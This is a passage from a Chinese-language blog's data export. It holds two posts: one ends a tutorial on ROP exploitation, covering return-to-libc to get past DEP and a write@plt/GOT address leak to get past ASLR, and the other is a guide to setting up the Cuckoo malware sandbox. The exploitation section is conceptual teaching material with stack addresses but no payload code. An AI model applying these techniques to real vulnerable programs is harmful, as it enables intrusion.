vmdk 文件下载，比较方便部署，但是具体使用的时候仍然无法支持使用 VirtualBox 启动通过，因此此处仅作一个想法记录下来。具体的安装方法不再叙述，同样给虚拟机分配了两个网卡，以方便联网和联入测试。\n\n## DEP 防护原理\n\n前一攻击方法使用的是直接将 Shellcode 写到栈然后执行，通过在编译的时候增加 stack-protector 参数，使得程序栈无法直接执行代码来实现防护。\n\n## 调用 System 函数的原理\n\n伪造堆栈调用 system 函数之前所需要的内容，使得 vulnerable_function 返回时的 jump 变成了实际对 system 函数的调用。这边最理想的情况是调用完 system 函数后，如果 system 函数返回，则能够正常返回到 vulnerable_function 之前的返回地址，程序运行不会出现任何异常。\n\n首先再次回顾下此时的堆栈:\n\n![调用read函数前的堆栈](/img/rop_stack_2.png)\n\n实际上我们现在能做的是从 0xbffffc30 开始来操纵栈中的数据内容，本来函数是通过 jmp eip 来返回到 main 函数的，但是通过更改 0xbffffcbc 处的地址为 system 函数的地址，使得这个返回变成了跳转入指定的函数调用中，并且此时 0xbffffcc4 处地址作为了改函数的调用参数，而 0xbffffcc0 处则是 system 函数的返回地址，通过修改此处地址的内容，可以确保 system 函数退出时程序不崩溃出现异常。\n\n![调用 system 函数前的堆栈](/img/rop_stack_4.png)\n\n## 总结\n\n由此可见，Return to libc 技术，就是在栈区域无法直接执行代码的时候，通过返回到 glibc 中的函数，并传入 glibc 中的参数来执行指定函数。由此也可以看到，这种方法的前提是 glibc 中存在想要执行的函数与对应的参数。\n\n# ROP攻击: 绕过 DEP 和 ASLR 保护\n\n增加了 ASLR 保护后，最明显的改变是不再有固定地址的函数。所有系统函数的地址均是未知的，不再能够直接调用到这些函数了。但是对应仍然存在一定的绕过方法。其基本思想是找到（泄露）一个已知函数的实际地址，然后通过这个函数和我们需要执行函数的偏移计算出所需要实际调用的函数地址，那么这个问题就转换为如何找到（泄露）一个已知函数的实际地址了。\n\n关于 Linux 的 PLT 和 GOT，本来想写一篇相关的文章，但是看到了 [海枫](https://blog.csdn.net/linyt) 写的相关文章之后，顿时觉得完全没有必要了，他已经将相关的知识点讲解的非常清楚。\n\n这里具体使用的方法是依据程序中的 write@plt 函数泄露了 write 函数的地址，为了达到这个目标，需要在栈上伪造了对 write@plt 函数的调用，栈布局如下图所示，这里面通过 write 将 write.got 中存储 write 函数地址的内容写入到 stdout 中，然后解析返回结果，就成功获取了 write 函数的地址。后续的利用过程则和前文中的 Return-to-libc 一致，这里不再赘述。\n\n![调用 write 函数前的堆栈](/img/rop_stack_5.png)\n\n# 参考列表\n\n[压栈， 跳转，执行，返回：从汇编看函数调用](https://www.jianshu.com/p/594357dff57e)\n[Linux下pwn从入门到放弃](https://xz.aliyun.com/t/1803)\n[Exploit Mitigation Techniques - Data Execution Prevention (DEP)](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n[https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation](Linux (x86) Exploit 开发系列教程之八 绕过 ASLR -- 第三部分)\n[got、plt表介绍](https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/)\n[聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT](https://blog.csdn.net/linyt/article/details/51635768)","slug":"ROP-part2","published":1,"comments":1,"layout":"post","photos":[],"_id":"clypxqmmw0019xrn5as6ccqo7","content":"<h1 id=\"ROP攻击-使用-Return-to-libc-绕过-DEP-防护\"><a href=\"#ROP攻击-使用-Return-to-libc-绕过-DEP-防护\" class=\"headerlink\" title=\"ROP攻击: 使用 Return-to-libc 绕过 DEP 防护\"></a>ROP攻击: 使用 Return-to-libc 绕过 DEP 防护</h1><h2 id=\"使用-Ubuntu-cloud-image-构建基本测试环境\"><a href=\"#使用-Ubuntu-cloud-image-构建基本测试环境\" class=\"headerlink\" title=\"使用 Ubuntu cloud image 构建基本测试环境\"></a>使用 Ubuntu cloud image 构建基本测试环境</h2><p>这时我遇到了一个坑，发现基于 Alpine Linux 测试始终不通过，因此不得不再次改用了 Ubuntu 进行测试。猜测应该是因为 Alpine Linux 不再基于 glibc，利用方法可能有所改变。</p>\n<p>本来想选择的镜像是 Ubuntu Cloud Image，具体的版本是 Ubuntu xenial 16.04 LTS。Ubuntu Cloud Image 所提供的镜像比较精简，一般大小只有 200MB 多，适合快速下载，同时也提供了 Vmware 的 vmdk 文件下载，比较方便部署，但是具体使用的时候仍然无法支持使用 VirtualBox 启动通过，因此此处仅作一个想法记录下来。具体的安装方法不再叙述，同样给虚拟机分配了两个网卡，以方便联网和联入测试。</p>\n<h2 id=\"DEP-防护原理\"><a href=\"#DEP-防护原理\" class=\"headerlink\" title=\"DEP 防护原理\"></a>DEP 防护原理</h2><p>前一攻击方法使用的是直接将 Shellcode 写到栈然后执行，通过在编译的时候增加 stack-protector 参数，使得程序栈无法直接执行代码来实现防护。</p>\n<h2 id=\"调用-System-函数的原理\"><a href=\"#调用-System-函数的原理\" class=\"headerlink\" title=\"调用 System 函数的原理\"></a>调用 System 函数的原理</h2><p>伪造堆栈调用 system 函数之前所需要的内容，使得 vulnerable_function 返回时的 jump 变成了实际对 system 函数的调用。这边最理想的情况是调用完 system 函数后，如果 system 函数返回，则能够正常返回到 vulnerable_function 之前的返回地址，程序运行不会出现任何异常。</p>\n<p>首先再次回顾下此时的堆栈:</p>\n<p><img src=\"/img/rop_stack_2.png\" alt=\"调用read函数前的堆栈\"></p>\n<p>实际上我们现在能做的是从 0xbffffc30 开始来操纵栈中的数据内容，本来函数是通过 jmp eip 来返回到 main 函数的，但是通过更改 0xbffffcbc 处的地址为 system 函数的地址，使得这个返回变成了跳转入指定的函数调用中，并且此时 0xbffffcc4 处地址作为了改函数的调用参数，而 0xbffffcc0 处则是 system 函数的返回地址，通过修改此处地址的内容，可以确保 system 函数退出时程序不崩溃出现异常。</p>\n<p><img src=\"/img/rop_stack_4.png\" alt=\"调用 system 函数前的堆栈\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>由此可见，Return to libc 技术，就是在栈区域无法直接执行代码的时候，通过返回到 glibc 中的函数，并传入 glibc 中的参数来执行指定函数。由此也可以看到，这种方法的前提是 glibc 中存在想要执行的函数与对应的参数。</p>\n<h1 id=\"ROP攻击-绕过-DEP-和-ASLR-保护\"><a href=\"#ROP攻击-绕过-DEP-和-ASLR-保护\" class=\"headerlink\" title=\"ROP攻击: 绕过 DEP 和 ASLR 保护\"></a>ROP攻击: 绕过 DEP 和 ASLR 保护</h1><p>增加了 ASLR 保护后，最明显的改变是不再有固定地址的函数。所有系统函数的地址均是未知的，不再能够直接调用到这些函数了。但是对应仍然存在一定的绕过方法。其基本思想是找到（泄露）一个已知函数的实际地址，然后通过这个函数和我们需要执行函数的偏移计算出所需要实际调用的函数地址，那么这个问题就转换为如何找到（泄露）一个已知函数的实际地址了。</p>\n<p>关于 Linux 的 PLT 和 GOT，本来想写一篇相关的文章，但是看到了 <a href=\"https://blog.csdn.net/linyt\">海枫</a> 写的相关文章之后，顿时觉得完全没有必要了，他已经将相关的知识点讲解的非常清楚。</p>\n<p>这里具体使用的方法是依据程序中的 write@plt 函数泄露了 write 函数的地址，为了达到这个目标，需要在栈上伪造了对 write@plt 函数的调用，栈布局如下图所示，这里面通过 write 将 write.got 中存储 write 函数地址的内容写入到 stdout 中，然后解析返回结果，就成功获取了 write 函数的地址。后续的利用过程则和前文中的 Return-to-libc 一致，这里不再赘述。</p>\n<p><img src=\"/img/rop_stack_5.png\" alt=\"调用 write 函数前的堆栈\"></p>\n<h1 id=\"参考列表\"><a href=\"#参考列表\" class=\"headerlink\" title=\"参考列表\"></a>参考列表</h1><p><a href=\"https://www.jianshu.com/p/594357dff57e\">压栈， 跳转，执行，返回：从汇编看函数调用</a><br><a href=\"https://xz.aliyun.com/t/1803\">Linux下pwn从入门到放弃</a><br><a href=\"https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634\">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</a><br>[<a href=\"https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation%5D\">https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation]</a>(Linux (x86) Exploit 开发系列教程之八 绕过 ASLR – 第三部分)<br><a href=\"https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/\">got、plt表介绍</a><br><a href=\"https://blog.csdn.net/linyt/article/details/51635768\">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a></p>\n","excerpt":"","more":"<h1 id=\"ROP攻击-使用-Return-to-libc-绕过-DEP-防护\"><a href=\"#ROP攻击-使用-Return-to-libc-绕过-DEP-防护\" class=\"headerlink\" title=\"ROP攻击: 使用 Return-to-libc 绕过 DEP 防护\"></a>ROP攻击: 使用 Return-to-libc 绕过 DEP 防护</h1><h2 id=\"使用-Ubuntu-cloud-image-构建基本测试环境\"><a href=\"#使用-Ubuntu-cloud-image-构建基本测试环境\" class=\"headerlink\" title=\"使用 Ubuntu cloud image 构建基本测试环境\"></a>使用 Ubuntu cloud image 构建基本测试环境</h2><p>这时我遇到了一个坑，发现基于 Alpine Linux 测试始终不通过，因此不得不再次改用了 Ubuntu 进行测试。猜测应该是因为 Alpine Linux 不再基于 glibc，利用方法可能有所改变。</p>\n<p>本来想选择的镜像是 Ubuntu Cloud Image，具体的版本是 Ubuntu xenial 16.04 LTS。Ubuntu Cloud Image 所提供的镜像比较精简，一般大小只有 200MB 多，适合快速下载，同时也提供了 Vmware 的 vmdk 文件下载，比较方便部署，但是具体使用的时候仍然无法支持使用 VirtualBox 启动通过，因此此处仅作一个想法记录下来。具体的安装方法不再叙述，同样给虚拟机分配了两个网卡，以方便联网和联入测试。</p>\n<h2 id=\"DEP-防护原理\"><a href=\"#DEP-防护原理\" class=\"headerlink\" title=\"DEP 防护原理\"></a>DEP 防护原理</h2><p>前一攻击方法使用的是直接将 Shellcode 写到栈然后执行，通过在编译的时候增加 stack-protector 参数，使得程序栈无法直接执行代码来实现防护。</p>\n<h2 id=\"调用-System-函数的原理\"><a href=\"#调用-System-函数的原理\" class=\"headerlink\" title=\"调用 System 函数的原理\"></a>调用 System 函数的原理</h2><p>伪造堆栈调用 system 函数之前所需要的内容，使得 vulnerable_function 返回时的 jump 变成了实际对 system 函数的调用。这边最理想的情况是调用完 system 函数后，如果 system 函数返回，则能够正常返回到 vulnerable_function 之前的返回地址，程序运行不会出现任何异常。</p>\n<p>首先再次回顾下此时的堆栈:</p>\n<p><img src=\"/img/rop_stack_2.png\" alt=\"调用read函数前的堆栈\"></p>\n<p>实际上我们现在能做的是从 0xbffffc30 开始来操纵栈中的数据内容，本来函数是通过 jmp eip 来返回到 main 函数的，但是通过更改 0xbffffcbc 处的地址为 system 函数的地址，使得这个返回变成了跳转入指定的函数调用中，并且此时 0xbffffcc4 处地址作为了改函数的调用参数，而 0xbffffcc0 处则是 system 函数的返回地址，通过修改此处地址的内容，可以确保 system 函数退出时程序不崩溃出现异常。</p>\n<p><img src=\"/img/rop_stack_4.png\" alt=\"调用 system 函数前的堆栈\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>由此可见，Return to libc 技术，就是在栈区域无法直接执行代码的时候，通过返回到 glibc 中的函数，并传入 glibc 中的参数来执行指定函数。由此也可以看到，这种方法的前提是 glibc 中存在想要执行的函数与对应的参数。</p>\n<h1 id=\"ROP攻击-绕过-DEP-和-ASLR-保护\"><a href=\"#ROP攻击-绕过-DEP-和-ASLR-保护\" class=\"headerlink\" title=\"ROP攻击: 绕过 DEP 和 ASLR 保护\"></a>ROP攻击: 绕过 DEP 和 ASLR 保护</h1><p>增加了 ASLR 保护后，最明显的改变是不再有固定地址的函数。所有系统函数的地址均是未知的，不再能够直接调用到这些函数了。但是对应仍然存在一定的绕过方法。其基本思想是找到（泄露）一个已知函数的实际地址，然后通过这个函数和我们需要执行函数的偏移计算出所需要实际调用的函数地址，那么这个问题就转换为如何找到（泄露）一个已知函数的实际地址了。</p>\n<p>关于 Linux 的 PLT 和 GOT，本来想写一篇相关的文章，但是看到了 <a href=\"https://blog.csdn.net/linyt\">海枫</a> 写的相关文章之后，顿时觉得完全没有必要了，他已经将相关的知识点讲解的非常清楚。</p>\n<p>这里具体使用的方法是依据程序中的 write@plt 函数泄露了 write 函数的地址，为了达到这个目标，需要在栈上伪造了对 write@plt 函数的调用，栈布局如下图所示，这里面通过 write 将 write.got 中存储 write 函数地址的内容写入到 stdout 中，然后解析返回结果，就成功获取了 write 函数的地址。后续的利用过程则和前文中的 Return-to-libc 一致，这里不再赘述。</p>\n<p><img src=\"/img/rop_stack_5.png\" alt=\"调用 write 函数前的堆栈\"></p>\n<h1 id=\"参考列表\"><a href=\"#参考列表\" class=\"headerlink\" title=\"参考列表\"></a>参考列表</h1><p><a href=\"https://www.jianshu.com/p/594357dff57e\">压栈， 跳转，执行，返回：从汇编看函数调用</a><br><a href=\"https://xz.aliyun.com/t/1803\">Linux下pwn从入门到放弃</a><br><a href=\"https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634\">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</a><br>[<a href=\"https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation%5D\">https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation]</a>(Linux (x86) Exploit 开发系列教程之八 绕过 ASLR – 第三部分)<br><a href=\"https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/\">got、plt表介绍</a><br><a href=\"https://blog.csdn.net/linyt/article/details/51635768\">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a></p>\n"},{"title":"搭建Cuckoo沙盒测试环境","date":"2015-04-25T16:34:13.000Z","_content":"\nCuckoo是一款用于自动化分析恶意样本的沙箱软件。相比其他沙箱软件，Cuckoo具备强大的监控功能，能够自动将程序提交到指定的虚拟机中，并依据格式运行，同时会Hook相关的函数接口，记录下的重要的函数调用、网络访问。Cuckoo基于Python编写，通过在此基础上进行修改，可以避免重复开发，增加所需要的特殊功能。\n\n网站https://malwr.com/可以认为是一个在线版的Cuckoo，国内也样相关的在线样本行为分析网站[火眼](https://fireeye.ijinshan.com/)和[文件B超](https://www.b-chao.com)，个人怀疑他们也是在Cuckoo的基础上进行修改的。\n\n本文的主要内容是在Linux系统上安装Cuckoo。\n\n## 安装过程\n\n### 1. 基本运行环境\n\n* Python\n\n安装Python并根据requirements.txt中的列表直接安装所需要的python模块。\n\n* MongoDB\n\n如果想使用基于Django的网页接口，则需要安装MongoDB\n\n* 各个虚拟机的接口库\n\nKVM、XenServer的API接口\n\n### 2. 功能软件\n\n#### 安装Yara\n\nYara是一款用于识别和分类恶意样本的开源工具，可以理解为是一款特征匹配工具。\n\nYara默认没有编译对cuckoo和magic的支持，在编译时需要加上`./configure --enable-cuckoo --enable-magic`选项。\n\n安装yara-python库，使得cuckoo能够调用yara。\n\n#### 安装ssdeep\n\nssdeep能够计算一个文件的模糊哈希代码，通过计算不同样本之间的ssdeep差值，可以判断两个样本是否相近。\n\n#### Tcpdump\n\n用于截获数据。\n\n#### 安装cuckoo\n\ncuckoo居然没有在ArchLinux的软件包中，这是很神奇的一件事，所以必须手动Github下载，并且手动更新。\n\n`git clone git@github.com:cuckoobox/cuckoo.git`\n\n### 3. 可选软件\n\n### Volatility\n\n这是一款分析内存dumps的工具。\n\n### 4. 安装虚拟机\n\nCuckoo支持多种虚拟机，官方推荐使用的是VirutalBox虚拟机（应该是因为开源的缘故），其他的还支持VMware、XenServer、ESX、KVM等虚拟机（参考modules/machinery目录），个人处于使用惯性，选择了使用VMware。\n\n虚拟机内安装基本操作系统，取消防火墙，并安装Python运行环境，然后运行agent/agent.py，使得虚拟机处于等待接收参数和处理任务状态，并对此状态保存快照。\n\n## 配置\n\n#### cuckoo.conf\n\n[cuckoo]machinery: 虚拟机类型，可以填virutalbox，vmware等\n\n[resultserver]ip port: 存储结果的服务器IP，可以直接填写本机（物理机）\n\n[database]connection: 数据库连接，不填可以直接使用SQLite数据库\n\n#### auxiliary.conf\n\n主要用于监控网卡数据相关配置\n\n[sniffer]interface: 改为和虚拟机共用的网卡\n\n#### vmware.conf\n\n具体的虚拟机设置，本例中使用vmware.conf\n\nmachines: 具体的虚拟机配置，必须与下面的字段名称一致\n\nvmx_path: 表示虚拟机vmx文件的路径\n\nsnapshot: 快照名称\n\nip: 虚拟机IP地址\n\n#### processing.conf\n\n处理样本时需要使用各种附加模块，我禁用了Virustotal。此外，如果自己添加了模块，则需要在这个文件中启用\n\n#### memory.conf\n\n用于Volatility处理模块，需要首先在processing.conf启用memory模块才行。\n\n#### reporting.conf\n\n配置报告服务器，我修改了mongodb字段，使其将数据存储到了MongoDB中\n\n## 运行\n\n### 启动cuckoo\n\n`python2 cuckoo.py`\n\n如果失败，可以使用-d参数，输出更多的内容用于调试确认错误信息。\n\n### 提交文件分析\n\n`python2 utils/submit.py [文件路径] --url [网址]`\n\n\n","source":"_posts/Sandbox.md","raw":"title: \"搭建Cuckoo沙盒测试环境\"\ndate: 2015-04-25 16:34:13\ntags:\n---\n\nCuckoo是一款用于自动化分析恶意样本的沙箱软件。相比其他沙箱软件，Cuckoo具备强大的监控功能，能够自动将程序提交到指定的虚拟机中，并依据格式运行，同时会Hook相关的函数接口，记录下的重要的函数调用、网络访问。Cuckoo基于Python编写，通过在此基础上进行修改，可以避免重复开发，增加所需要的特殊功能。\n\n网站https://malwr.com/可以认为是一个在线版的Cuckoo，国内也样相关的在线样本行为分析网站[火眼](https://fireeye.ijinshan.com/)和[文件B超](https://www.b-chao.com)，个人怀疑他们也是在Cuckoo的基础上进行修改的。\n\n本文的主要内容是在Linux系统上安装Cuckoo。\n\n## 安装过程\n\n### 1. 基本运行环境\n\n* Python\n\n安装Python并根据requirements.txt中的列表直接安装所需要的python模块。\n\n* MongoDB\n\n如果想使用基于Django的网页接口，则需要安装MongoDB\n\n* 各个虚拟机的接口库\n\nKVM、XenServer的API接口\n\n### 2. 功能软件\n\n#### 安装Yara\n\nYara是一款用于识别和分类恶意样本的开源工具，可以理解为是一款特征匹配工具。\n\nYara默认没有编译对cuckoo和magic的支持，在编译时需要加上`./configure --enable-cuckoo --enable-magic`选项。\n\n安装yara-python库，使得cuckoo能够调用yara。\n\n#### 安装ssdeep\n\nssdeep能够计算一个文件的模糊哈希代码，通过计算不同样本之间的ssdeep差值，可以判断两个样本是否相近。\n\n#### Tcpdump\n\n用于截获数据。\n\n#### 安装cuckoo\n\ncuckoo居然没有在ArchLinux的软件包中，这是很神奇的一件事，所以必须手动Github下载，并且手动更新。\n\n`git clone git@github.com:cuckoobox/cuckoo.git`\n\n### 3. 可选软件\n\n### Volatility\n\n这是一款分析内存dumps的工具。\n\n### 4. 安装虚拟机\n\nCuckoo支持多种虚拟机，官方推荐使用的是VirutalBox虚拟机（应该是因为开源的缘故），其他的还支持VMware、XenServer、ESX、KVM等虚拟机（参考modules/machinery目录），个人处于使用惯性，选择了使用VMware。\n\n虚拟机内安装基本操作系统，取消防火墙，并安装Python运行环境，然后运行agent/agent.py，使得虚拟机处于等待接收参数和处理任务状态，并对此状态保存快照。\n\n## 配置\n\n#### cuckoo.conf\n\n[cuckoo]machinery: 虚拟机类型，可以填virutalbox，vmware等\n\n[resultserver]ip port: 存储结果的服务器IP，可以直接填写本机（物理机）\n\n[database]connection: 数据库连接，不填可以直接使用SQLite数据库\n\n#### auxiliary.conf\n\n主要用于监控网卡数据相关配置\n\n[sniffer]interface: 改为和虚拟机共用的网卡\n\n#### vmware.conf\n\n具体的虚拟机设置，本例中使用vmware.conf\n\nmachines: 具体的虚拟机配置，必须与下面的字段名称一致\n\nvmx_path: 表示虚拟机vmx文件的路径\n\nsnapshot: 快照名称\n\nip: 虚拟机IP地址\n\n#### processing.conf\n\n处理样本时需要使用各种附加模块，我禁用了Virustotal。此外，如果自己添加了模块，则需要在这个文件中启用\n\n#### memory.conf\n\n用于Volatility处理模块，需要首先在processing.conf启用memory模块才行。\n\n#### reporting.conf\n\n配置报告服务器，我修改了mongodb字段，使其将数据存储到了MongoDB中\n\n## 运行\n\n### 启动cuckoo\n\n`python2 cuckoo.py`\n\n如果失败，可以使用-d参数，输出更多的内容用于调试确认错误信息。\n\n### 提交文件分析\n\n`python2 utils/submit.py [文件路径] --url [网址]`\n\n\n","slug":"Sandbox","published":1,"updated":"2020-09-07T02:31:06.570Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmx001bxrn5gy1x28j9","content":"<p>Cuckoo是一款用于自动化分析恶意样本的沙箱软件。相比其他沙箱软件，Cuckoo具备强大的监控功能，能够自动将程序提交到指定的虚拟机中，并依据格式运行，同时会Hook相关的函数接口，记录下的重要的函数调用、网络访问。Cuckoo基于Python编写，通过在此基础上进行修改，可以避免重复开发，增加所需要的特殊功能。</p>\n<p>网站<a href=\"https://malwr.com/%E5%8F%AF%E4%BB%A5%E8%AE%A4%E4%B8%BA%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E7%89%88%E7%9A%84Cuckoo%EF%BC%8C%E5%9B%BD%E5%86%85%E4%B9%9F%E6%A0%B7%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99[%E7%81%AB%E7%9C%BC](https://fireeye.ijinshan.com/)%E5%92%8C[%E6%96%87%E4%BB%B6B%E8%B6%85](https://www.b-chao.com)%EF%BC%8C%E4%B8%AA%E4%BA%BA%E6%80%80%E7%96%91%E4%BB%96%E4%BB%AC%E4%B9%9F%E6%98%AF%E5%9C%A8Cuckoo%E7%9A%84%E5%9F%BA%E7%A1%80%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%E7%9A%84%E3%80%82\">https://malwr.com/可以认为是一个在线版的Cuckoo，国内也样相关的在线样本行为分析网站[火眼](https://fireeye.ijinshan.com/)和[文件B超](https://www.b-chao.com)，个人怀疑他们也是在Cuckoo的基础上进行修改的。</a></p>\n<p>本文的主要内容是在Linux系统上安装Cuckoo。</p>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><h3 id=\"1-基本运行环境\"><a href=\"#1-基本运行环境\" class=\"headerlink\" title=\"1. 基本运行环境\"></a>1. 基本运行环境</h3><ul>\n<li>Python</li>\n</ul>\n<p>安装Python并根据requirements.txt中的列表直接安装所需要的python模块。</p>\n<ul>\n<li>MongoDB</li>\n</ul>\n<p>如果想使用基于Django的网页接口，则需要安装MongoDB</p>\n<ul>\n<li>各个虚拟机的接口库</li>\n</ul>\n<p>KVM、XenServer的API接口</p>\n<h3 id=\"2-功能软件\"><a href=\"#2-功能软件\" class=\"headerlink\" title=\"2. 功能软件\"></a>2. 功能软件</h3><h4 id=\"安装Yara\"><a href=\"#安装Yara\" class=\"headerlink\" title=\"安装Yara\"></a>安装Yara</h4><p>Yara是一款用于识别和分类恶意样本的开源工具，可以理解为是一款特征匹配工具。</p>\n<p>Yara默认没有编译对cuckoo和magic的支持，在编译时需要加上<code>./configure --enable-cuckoo --enable-magic</code>选项。</p>\n<p>安装yara-python库，使得cuckoo能够调用yara。</p>\n<h4 id=\"安装ssdeep\"><a href=\"#安装ssdeep\" class=\"headerlink\" title=\"安装ssdeep\"></a>安装ssdeep</h4><p>ssdeep能够计算一个文件的模糊哈希代码，通过计算不同样本之间的ssdeep差值，可以判断两个样本是否相近。</p>\n<h4 id=\"Tcpdump\"><a href=\"#Tcpdump\" class=\"headerlink\" title=\"Tcpdump\"></a>Tcpdump</h4><p>用于截获数据。</p>\n<h4 id=\"安装cuckoo\"><a href=\"#安装cuckoo\" class=\"headerlink\" title=\"安装cuckoo\"></a>安装cuckoo</h4><p>cuckoo居然没有在ArchLinux的软件包中，这是很神奇的一件事，所以必须手动Github下载，并且手动更新。</p>\n<p><code>git clone git@github.com:cuckoobox/cuckoo.git</code></p>\n<h3 id=\"3-可选软件\"><a href=\"#3-可选软件\" class=\"headerlink\" title=\"3. 可选软件\"></a>3. 可选软件</h3><h3 id=\"Volatility\"><a href=\"#Volatility\" class=\"headerlink\" title=\"Volatility\"></a>Volatility</h3><p>这是一款分析内存dumps的工具。</p>\n<h3 id=\"4-安装虚拟机\"><a href=\"#4-安装虚拟机\" class=\"headerlink\" title=\"4. 安装虚拟机\"></a>4. 安装虚拟机</h3><p>Cuckoo支持多种虚拟机，官方推荐使用的是VirutalBox虚拟机（应该是因为开源的缘故），其他的还支持VMware、XenServer、ESX、KVM等虚拟机（参考modules&#x2F;machinery目录），个人处于使用惯性，选择了使用VMware。</p>\n<p>虚拟机内安装基本操作系统，取消防火墙，并安装Python运行环境，然后运行agent&#x2F;agent.py，使得虚拟机处于等待接收参数和处理任务状态，并对此状态保存快照。</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><h4 id=\"cuckoo-conf\"><a href=\"#cuckoo-conf\" class=\"headerlink\" title=\"cuckoo.conf\"></a>cuckoo.conf</h4><p>[cuckoo]machinery: 虚拟机类型，可以填virutalbox，vmware等</p>\n<p>[resultserver]ip port: 存储结果的服务器IP，可以直接填写本机（物理机）</p>\n<p>[database]connection: 数据库连接，不填可以直接使用SQLite数据库</p>\n<h4 id=\"auxiliary-conf\"><a href=\"#auxiliary-conf\" class=\"headerlink\" title=\"auxiliary.conf\"></a>auxiliary.conf</h4><p>主要用于监控网卡数据相关配置</p>\n<p>[sniffer]interface: 改为和虚拟机共用的网卡</p>\n<h4 id=\"vmware-conf\"><a href=\"#vmware-conf\" class=\"headerlink\" title=\"vmware.conf\"></a>vmware.conf</h4><p>具体的虚拟机设置，本例中使用vmware.conf</p>\n<p>machines: 具体的虚拟机配置，必须与下面的字段名称一致</p>\n<p>vmx_path: 表示虚拟机vmx文件的路径</p>\n<p>snapshot: 快照名称</p>\n<p>ip: 虚拟机IP地址</p>\n<h4 id=\"processing-conf\"><a href=\"#processing-conf\" class=\"headerlink\" title=\"processing.conf\"></a>processing.conf</h4><p>处理样本时需要使用各种附加模块，我禁用了Virustotal。此外，如果自己添加了模块，则需要在这个文件中启用</p>\n<h4 id=\"memory-conf\"><a href=\"#memory-conf\" class=\"headerlink\" title=\"memory.conf\"></a>memory.conf</h4><p>用于Volatility处理模块，需要首先在processing.conf启用memory模块才行。</p>\n<h4 id=\"reporting-conf\"><a href=\"#reporting-conf\" class=\"headerlink\" title=\"reporting.conf\"></a>reporting.conf</h4><p>配置报告服务器，我修改了mongodb字段，使其将数据存储到了MongoDB中</p>\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"启动cuckoo\"><a href=\"#启动cuckoo\" class=\"headerlink\" title=\"启动cuckoo\"></a>启动cuckoo</h3><p><code>python2 cuckoo.py</code></p>\n<p>如果失败，可以使用-d参数，输出更多的内容用于调试确认错误信息。</p>\n<h3 id=\"提交文件分析\"><a href=\"#提交文件分析\" class=\"headerlink\" title=\"提交文件分析\"></a>提交文件分析</h3><p><code>python2 utils/submit.py [文件路径] --url [网址]</code></p>\n","excerpt":"","more":"<p>Cuckoo是一款用于自动化分析恶意样本的沙箱软件。相比其他沙箱软件，Cuckoo具备强大的监控功能，能够自动将程序提交到指定的虚拟机中，并依据格式运行，同时会Hook相关的函数接口，记录下的重要的函数调用、网络访问。Cuckoo基于Python编写，通过在此基础上进行修改，可以避免重复开发，增加所需要的特殊功能。</p>\n<p>网站<a href=\"https://malwr.com/%E5%8F%AF%E4%BB%A5%E8%AE%A4%E4%B8%BA%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E7%89%88%E7%9A%84Cuckoo%EF%BC%8C%E5%9B%BD%E5%86%85%E4%B9%9F%E6%A0%B7%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99[%E7%81%AB%E7%9C%BC](https://fireeye.ijinshan.com/)%E5%92%8C[%E6%96%87%E4%BB%B6B%E8%B6%85](https://www.b-chao.com)%EF%BC%8C%E4%B8%AA%E4%BA%BA%E6%80%80%E7%96%91%E4%BB%96%E4%BB%AC%E4%B9%9F%E6%98%AF%E5%9C%A8Cuckoo%E7%9A%84%E5%9F%BA%E7%A1%80%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%E7%9A%84%E3%80%82\">https://malwr.com/可以认为是一个在线版的Cuckoo，国内也样相关的在线样本行为分析网站[火眼](https://fireeye.ijinshan.com/)和[文件B超](https://www.b-chao.com)，个人怀疑他们也是在Cuckoo的基础上进行修改的。</a></p>\n<p>本文的主要内容是在Linux系统上安装Cuckoo。</p>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><h3 id=\"1-基本运行环境\"><a href=\"#1-基本运行环境\" class=\"headerlink\" 